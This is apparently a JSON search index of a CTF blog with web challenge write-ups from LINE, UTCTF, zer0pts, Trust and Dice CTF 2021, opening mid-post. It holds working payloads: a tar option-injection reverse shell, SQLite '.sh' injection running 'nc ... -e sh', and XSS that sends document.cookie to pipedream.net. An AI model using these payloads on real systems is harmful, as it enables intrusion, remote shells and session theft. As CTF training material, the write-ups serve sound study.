sys._getframe().f_code.co_name ,c = type(e).__name__, m = str(e), l = sys.exc_info()[-1].tb_lineno))        return \"exception!!\"        passRunRollbackDB() is a function that reads and returns a FLAG file if the backup/dbhash file exists, as seen above.So I thought with the following scenario at first  Scenario 1          Using ssrf vulnerability to send a request to /integrityStatus to get the value of dbHash.      Read the FLAG by sending a request to /rollback using the retrieved value of dbHash.      FLAG is returned as a header value of lang.      However, an exploit was attempted using the above scenario, but the attack could not be performed because the value of self.dbHash and dbHash in the IntegrityCheck() function had to be different.def WriteFile(url):    local_filename = url.split('/')[-1]    with requests.get(url, stream=True) as r:        r.raise_for_status()        with open('backup/'+local_filename, 'wb') as f:            for chunk in r.iter_content(chunk_size=8192):                 f.write(chunk)So, when I analyzed the code again, I could see that the WriteFile() function was used to create a file under backup/. So, if you create any file using WriteFile function and send the name of the file to dbHash, it is not the same as the value of self.dbHash, which is a variable in the class, and it is Because it exists, it is enough to bypass it and read the flags.When I see inside the WriteFile() function, a request is sent using the requests.get() function, and the value of url.split('/')[-1] is used as the file name to create it.@app.route('/download', methods=['GET','POST'])def download():    try:        if request.headers.get('Sign') == None:            return json.dumps(status['sign'])        else:            if SignCheck(request):                pass            else:                return json.dumps(status['sign'])        if request.method == 'GET':            src = request.args.get('src')            if valid_download(src):                pass            else:                return json.dumps(status.get('false'))                        elif request.method == 'POST':            if valid_download(request.form['src']):                pass            else:                return json.dumps(status.get('false'))        WriteFile(src)        return json.dumps(status.get('success'))The WriteFile() function is called from /download. At this time, if the header value Sign exists, the return value of the SignCheck() function is true, and the src parameter value exists, WriteFile() function is executed.  Scenario 2          Using the ssrf vulnerability, a request was sent to /download to create a random file.      Again, using the ssrf vulnerability, sending a request to /rollback to read the FLAG      In this case, the self.dbHash != dbHash syntax is bypassed by using the file name.      Finally, just read the Lang header.        A note of caution          When creating a file, a request is sent using the requests.get() function, so when creating a file, a URL must be sent to create it.      The value of dbHash is parsed once more within the RunRollbackDB() function, and the value of e.isalnum() must be true.      When reading the flag, the value of the environment variable ENV should not be local, so port 5000 should be used instead of port 5050.      import hmacimport hashlibimport requestsurl = 'http://35.200.63.50/apis/'Key = hashlib.sha512(('ed05a1c7ff6428dcf8d50901b6e78ba3').encode('ascii')).hexdigest()print('[+] Key  : ' + Key)def sign(KEY):    privateKey = b'let\\'sbitcorinparty'    EN = hmac.new( privateKey , KEY.encode('utf-8'), hashlib.sha512 )    return EN.hexdigest()def integrityStatus():    headers = {'Host':'localhost:5000', 'Lang':'/integrityStatus'}    res = requests.get(url+'coin', headers=headers)    print('[+] headers in /apis/integreityStatus : ' + res.headers['lang'])def download():    headers = {'Host':'localhost:5000', 'Lang':'download?src=http://141.164.52.207/a123', 'Sign':sign('src=http://141.164.52.207/a123')}    res = requests.get(url+'coin', headers=headers)    print('[+] headers in /apis/download : ' + res.headers['lang'])def rollback():    headers = {'Host':'localhost:5000', 'Lang':'/rollback?dbhash=a123', 'Sign':sign('dbhash=a123'), 'Key':Key}    res = requests.get(url+'coin', headers=headers)    print('[+] headers in /apis/rollback : ' + res.headers['lang'])if __name__ == '__main__':    integrityStatus()    download()    rollback()FLAG : LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}"
  },
  
  {
    "title": "UTCTF 2021 Tar Inspector Write Up",
    "url": "/posts/UTCTF/",
    "categories": "",
    "tags": "",
    "date": "2021-03-15 08:29:53 +0900",
    





    
    "snippet": "(Web) Tar Inspector [994 pts]  Tar Inspector challenge is get the shell using RCE and read the flagMany people asked for a hint and the contest provided the code for the secure_filename() function....",
    "content": "(Web) Tar Inspector [994 pts]  Tar Inspector challenge is get the shell using RCE and read the flagMany people asked for a hint and the contest provided the code for the secure_filename() function. So first, I’ll see secure_filename().# creates a secured version of the filenamedef secure_filename(filename):    # strip extension and any sneaky path traversal stuff    filename = filename[:-4]    filename = os.path.basename(filename)    # escape shell metacharacters    filename = re.sub(\"(!|\\$|#|&amp;|\\\"|\\'|\\(|\\)|\\||&lt;|&gt;|`|\\\\\\|;)\", r\"\\\\\\1\", filename)    filename = re.sub(\"\\n\", \"\", filename)    # add extension    filename += '__'+hex(randrange(10000000))[2:]+'.tar'    return filenameYou can see that the secure_filename() function gets the file name excluding the extension, escapes all special characters, and creates a new file name by including a random value between the file names.Go into the challenge and you can will see the file upload function.If you upload any file, you can see that only the .tar extension can be uploaded. Probably I need to make RCE happen when i unpack the tar file. When unpack the tar file, I can execute file using --to-command option :)  Scenario  I compress the reverse shell code to tar file and I upload in server.  If you upload the tar file, you can see the newly created file name.  If you upload the created file again by name, it will be unpack and the file will be executed. Obviously, you need to add the --to-command option at this time.  And since the last in the file must be .tar, you can bypass it using the --exclude option.After uploading the tar file, you can see a file named pocas__bf9d0.tar was created :) Now, When you unpack the pocas__bf9d0.tar file, you can execute the reverse shell file.POST /upload HTTP/1.1Host: web2.utctf.live:8123Content-Length: 1566Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCvRhaPJjhVCXGrNConnection: close------WebKitFormBoundarytCvRhaPJjhVCXGrNContent-Disposition: form-data; name=\"file\"; filename=\"pocas__bf9d0.tar --to-command=python3${IFS}pocas.py --exclude=pocas.tar\"Content-Type: application/x-tar------WebKitFormBoundarytCvRhaPJjhVCXGrN--I used the --to-command/--exclude option as above.root@py:~# nc -lp 80/bin/sh: 0: can't access tty; job control turned off# iduid=0(root) gid=0(root) groups=0(root)# pwd/tmp/extracts# cat /flag.txtutflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}#You can see that it is unpacked, and the file is executed to get the shell :)FLAG : utflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}"
  },
  
  {
    "title": "zer0pts CTF 2021 Baby SQLi Write Up",
    "url": "/posts/Zer0pts/",
    "categories": "",
    "tags": "",
    "date": "2021-03-09 08:29:53 +0900",
    





    
    "snippet": "(Web) Baby SQLi [170 pts]  Baby SQLi challenge is bypass of waf and using shell command.First, You can using .system/.shell/.sh command and execute shell command in SQLite3// SQLite3 CLIsqlite&gt; ...",
    "content": "(Web) Baby SQLi [170 pts]  Baby SQLi challenge is bypass of waf and using shell command.First, You can using .system/.shell/.sh command and execute shell command in SQLite3// SQLite3 CLIsqlite&gt; .sh id|nc 141.164.52.207 2// Terminalroot@py:~# nc -lp 2uid=0(root) gid=0(root) groups=0(root)As above, you can see in sqlite3 executes a shell command using the .sh command.def sqlite3_query(sql):    p = subprocess.Popen(['sqlite3', 'database.db'],                         stdin=subprocess.PIPE,                         stdout=subprocess.PIPE,                         stderr=subprocess.PIPE)    o, e = p.communicate(sql.encode())    if e:        raise Exception(e)    result = []    for row in o.decode().split('\\n'):        if row == '': break        result.append(tuple(row.split('|')))    return resultLooking at the source code, you can line jump using the \\n character because using the communicate() in subporcess.Popen() in sqlite3_query().@app.route('/login', methods=['post'])def auth():    username = flask.request.form.get('username', default='', type=str)    password = flask.request.form.get('password', default='', type=str)    if len(username) &gt; 32 or len(password) &gt; 32:        flask.session['msg'] = 'Too long username or password'        return flask.redirect(flask.url_for('home'))    password_hash = hashlib.sha256(password.encode()).hexdigest()    result = None    try:        result = sqlite3_query(            'SELECT * FROM users WHERE username=\"{}\" AND password=\"{}\";'            .format(sqlite3_escape(username), password_hash)        )    except:        pass    if result:        flask.session['name'] = username    else:        flask.session['msg'] = 'Invalid Credential'    return flask.redirect(flask.url_for('home'))And looking at the source code in login logic, you can see that username/password value is input, the length is verified, and it is put in query statement and at this point, you can see that the username value is escaped. but, you don’t worry because treats escape characters as simple string is sqlite3.SELECT * FROM users where username = \"\\\" or 1=1 -- \" and password = \"pocas\";In other words, It doensn’t matter if it escaped as above.SELECT * FROM users where username = \"\\\";.sh id|nc 141.164.52.207 2;and password = \"pocas\";So, you can use shell command by doing line jumps as above and using the .sh command.import requestsurl = \"http://web.ctf.zer0pts.com:8004\"username = '\";\\n.sh id|nc 2376348879 2\\n'data = {\"username\": username, \"password\": \"pocas\"}requests.post(url+\"/login\", data)root@py:~# nc -lp 2uid=1000(app) gid=1000(app)root@py:~#If you write the exploit code as above, close SELECT statemnt and in the line immediately underneath execute .sh command.import requestsurl = \"http://web.ctf.zer0pts.com:8004\"username = '\";\\n.sh nc 2376348879 2 -e sh\\n'data = {\"username\": username, \"password\": \"pocas\"}requests.post(url+\"/login\", data)root@py:~# nc -lvnp 2Listening on 0.0.0.0 2Connection received on 165.227.180.221 38761iduid=1000(app) gid=1000(app)cat templates/index.html&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=\"UTF-8\"&gt;        &lt;title&gt;Welcome&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h1&gt;Welcome, !&lt;/h1&gt;                &lt;p&gt;No flag for you :(&lt;/p&gt;            &lt;/body&gt;&lt;/html&gt;Final, I pass the shell using e option about nc and read index.html and saw the flag.FLAG : zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}"
  },
  
  {
    "title": "Trust CTF 2021 Write Up",
    "url": "/posts/Trust-CTF/",
    "categories": "",
    "tags": "",
    "date": "2021-03-01 08:29:53 +0900",
    





    
    "snippet": "(Web) babyxss [270 pts]The babyxss challenge is a simple XSS challenge disguised as DOMPurify Bypass.&lt;?phprequire_once(\"secrets.php\");# This Challenge using newest version DomPurify..! Maybe une...",
    "content": "(Web) babyxss [270 pts]The babyxss challenge is a simple XSS challenge disguised as DOMPurify Bypass.&lt;?phprequire_once(\"secrets.php\");# This Challenge using newest version DomPurify..! Maybe unexploitable!!if(isset($_GET['name'])) {    header(\"content-security-policy: base-uri 'self'; block-all-mixed-content; connect-src 'self';\");    header('X-Frame-Options: DENY');    echo \"&lt;h1 id='name'&gt;Hello &lt;/h1&gt;\";    echo '&lt;script src=\"https://code.jquery.com/jquery-3.5.1.min.js\"integrity=\"sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;';    echo \"&lt;script type='text/javascript' src='https://cure53.de/purify.js'&gt;&lt;/script&gt;&lt;script&gt;var name='\". base64_encode($_GET['name']) .\"';document.getElementById('name').innerHTML += DOMPurify.sanitize($('&lt;p&gt;').html(atob(name)).text())&lt;/script&gt;\";}show_source(__FILE__);When accessing the challenge, the code above appears. CSP is also set, and below, DOMPurify is used to respond to XSS. So I just inserted something DOMPurify Bypass Payload and it was triggered, so I hijacked the cookie and got the flag.But the reason it was triggered wasn’t because it bypassed DOMPurify. Since DOMPurify is using the latest version, it was impossible to bypass it.$('&lt;p&gt;').html(atob(name)).text()However, you can see that the above code is passed as an argument to the sanitize() method. It goes into the DOM for a while right there, and that’s when XSS is triggered. So you can trigger an XSS using a normal payload.https://xss.trustctf.xyz/?name=%3Csvg%3E%3C/p%3E%3Cstyle%3E%3Ca%20id=%22%3C/style%3E%3Cimg%20src=1%20onerror=location.href=%27https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/?f=%27.concat(document.cookie)%3E%22%3EFLAG : TRUST{cf909172b91c8bf3f70c0e71f2809f36}(Web) FLAG Checker [1000 pts]The FLAG Checker challenge is a simple ReDos challenge. I just studied the theory and tried it for the first time, but it seems to be just a strange technique.Wrong.... &lt;?php    include \"./secret.php\";    $result = preg_match(\"/{$_GET['flag']}/\", $flag);    if ($flag === $_GET['answer'] &amp;&amp; $result === 1) {        echo $flag;    }    else {        echo \"Wrong....\";    }    highlight_file(__FILE__);?&gt;When I approach the problem, it comes up as above. I saw this problem a while ago, so I immediately thought of ReDos, and a flag came out when I abused it with that technique. I will not upload the code separately because a problem similar to that problem will be uploaded to webhacking.kr later.FLAG : TRUST{2ef0c0b759425eed6d3932c109e0fe74}(Web) nodejail (Not Solve) [400 pts]The nodejail challenge is a simple RCE challenge.When I approach the problem, I just see an input window. By entering the Javascript code, I was able to confirm that various characters were filtered.require(`child_process`).execSync(`c?t${IFS}~~`).toString()At the time of the competition, as above, ${IFS} was used to bypass the space. However, no matter how I tried as above, nothing happened to return only err, so I just gave up.require(`fs`).readdirSync(`./`)After the competition, when I asked Seungju, I was able to receive a code for searching for a directory using the fs module. When I saw the code above, I was so shocked. He thought he could only read and write files using the fs module, but it turned out to be the first time he knew that directories could be traversed.require(`child_process`).execSync(`\\x63at\\x20T\\x2a`).toString()And the second time, I was curious about how Kyung-jun solved it, so when I asked him, he saw that he bypassed the space using hexadecimal numbers as above, and it was absurd..FLAG : TRUST{th1s_1s_3xtrem3_n0d3_j41l}"
  },
  
  {
    "title": "Dice CTF 2021 Write Up",
    "url": "/posts/Dice-CTF/",
    "categories": "",
    "tags": "",
    "date": "2021-02-09 08:29:53 +0900",
    





    
    "snippet": "(Web) Babier CSP [107 pts]The Babier CSP challenge is a simple CSP Bypass challenge.&lt;script nonce=LRGWAXOY98Es0zz0QOVmag==&gt;elem.onclick = () =&gt; {  location = \"/?name=\" + encodeURIComponent...",
    "content": "(Web) Babier CSP [107 pts]The Babier CSP challenge is a simple CSP Bypass challenge.&lt;script nonce=LRGWAXOY98Es0zz0QOVmag==&gt;elem.onclick = () =&gt; {  location = \"/?name=\" + encodeURIComponent([\"apple\", \"orange\", \"pineapple\", \"pear\"][Math.floor(4 * Math.random())]);}&lt;/script&gt;If you check the source code, you can see that the nonce value of the script tag is set as above. I thought that the admin bot was also applying the nonce value as above.&lt;script nonce=LRGWAXOY98Es0zz0QOVmag==&gt;alert(1)&lt;/script&gt;&lt;script nonce=LRGWAXOY98Es0zz0QOVmag==&gt;location.href=\"https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net\"%2bdocument.cookie&lt;/script&gt;The payload used is as above.FLAG : dice{web_1s_a_stat3_0f_grac3_857720}(Web) Missing Flavortext [111 pts]The Missing Flavortext challenge is a SQL Injection challenge that bypasses single quotas by using the features of express.js.if ([req.body.username, req.body.password].some(v =&gt; v.includes('\\''))) {  return res.redirect('/');}In the code above, single quota is filtered using the includes function. However, this can be bypassed by passing it as an array because it only verifies strings.username=admin&amp;password[]=1&amp;password[]=' or '1'='1The payload used is as above.FLAG : dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}(Web) Web Utils [121 pts]The Web Utils challenge is a challenge that triggers XSS using a vulnerability when receiving the req.body value.// view.html&lt;head&gt;  &lt;script async&gt;    (async () =&gt; {      const id = window.location.pathname.split('/')[2];      if (! id) window.location = window.origin;      const res = await fetch(`${window.origin}/api/data/${id}`);      const { data, type } = await res.json();      if (! data || ! type ) window.location = window.origin;      if (type === 'link') return window.location = data;      if (document.readyState !== \"complete\")        await new Promise((r) =&gt; { window.addEventListener('load', r); });      document.title = 'Paste';      document.querySelector('div').textContent = data;    })()  &lt;/script&gt;&lt;/head&gt;It is view.html code, and if the type is link in the middle, you can see window.location as data. And if data contains a payload such as javascript:alert(1), you can trigger xss.// api.js(skip)module.exports = async (fastify) =&gt; {  fastify.post('createLink', {    handler: (req, rep) =&gt; {      const uid = database.generateUid(8);      const regex = new RegExp('^https?://');      if (! regex.test(req.body.data))        return rep        (skip)However, if you look at the link creation logic, the value of req.body.data is verified with a regular expression. So, you can’t put xss payload in the link creation logic.// api.js(skip)fastify.post('createPaste', {    handler: (req, rep) =&gt; {      const uid = database.generateUid(8);      database.addData({ type: 'paste', ...req.body, uid });      rep        .code(200)(skip)However, if you look at the logic that creates the Pate, there is no verification for req.body, which causes a vulnerability here. Using this, you can give type as link and data as xss payload.{\"data\":\"javascript:alert(1)\",\"type\":\"link\"}{\"data\":\"javascript:location.href='https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/'%2bdocument.cookie\",\"type\":\"link\"}The payload used is as above.FLAG : dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}(Web) Build a Panel [130 pts]The Build a Panel challenge is the challenge of reading flags using SQL Injection in the insert statement.app.get('/admin/debug/add_widget', async (req, res) =&gt; {    const cookies = req.cookies;    const queryParams = req.query;    if(cookies['token'] &amp;&amp; cookies['token'] == secret_token){        query = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('${queryParams['panelid']}', '${queryParams['widgetname']}', '${queryParams['widgetdata']}');`;        db.run(query, (err) =&gt; {            if(err){                console.log(err);                res.send('something went wrong');            }else{                res.send('success!');            }        });    }else{        res.redirect('/');    }});This is the logic of add_widget running on admin bot. When looking at the query, the input value is entered without any verification, so SQL Injection can be performed.If we put our panelid in panelid and a query that reads flag in widgetname, a widget is created on our server, and the widget name contains FLAG. (panelid is stored in a cookie.https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=pocas&amp;widgetname=adfdaf&amp;widgetdata=a'), ('pocas', (select flag from flag), '{\"type\":\"pocas\"}')--The payload used is as above.FLAG : dice{ch41n_ChAIn_aNd_m0Re_cHaIn}(Web) Web IDE [196 pts]The Web IDE challenge is a challenge that bypasses iframe sandbox and triggers XSS.  Scenario          We are using allow-scripts as an option for iframe, and the value we input is executed by the eval function in sandbox.html.      The path to the administrator’s cookie is /ide, so it is not easy to read the cookie. Because xss payload runs in /sandbox.html.      So, first you need to create a separate site and bypass the iframe sandbox.      If you bypass the iframe sandbox, you are not limited by sop, and you can freely execute xss payloads.      However, since xss payload is executed in /sandbox.html, it cannot read the admin cookie.      So, create an object using window.open(“/ide”), and execute xss payload on the object to steal the cookie.      &lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;title&gt;xss poc&lt;/title&gt;    &lt;script&gt;        async function sendMessage() {            // window open -&gt; make file -&gt; include it            const cmd=\"[].constructor.constructor(\\\"(async () =&gt; {const res = await fetch('https://web-ide.dicec.tf/ide/save', {method:'POST', headers: {'Content-Type': 'application/javascript'}, body: 'const myWindow = window.open(\\\\\\\"/ide\\\\\\\"); (async (myWindow) =&gt; { await setTimeout( async() =&gt; {await fetch(`https://en20uuq0p0wxmkp.m.pipedream.net/?flag=${myWindow.document.cookie}`)}, 500) })(myWindow)'}); const file_name = await res.text(); const scr = document.createElement('script'); scr.src = `/ide/saves/${file_name}`; document.body.appendChild(scr);})()\\\")()\"                        await new Promise((r) =&gt; { window.addEventListener(('load'), r); });            document.querySelector('iframe')              .contentWindow              .postMessage(cmd, '*');  // IDE -&gt; sandbox message        };    &lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;      &lt;img src='x' onerror=\"sendMessage()\" /&gt;      &lt;iframe name='hh' src=\"https://web-ide.dicec.tf/sandbox.html\" frameborder=\"0\"&gt;&lt;/iframe&gt;  &lt;/body&gt;&lt;/html&gt;The payload used is as above.FLAG :dice{c0uldn7_f1nd_4_b4ckr0nym_f0r_1de}"
  }
  
]

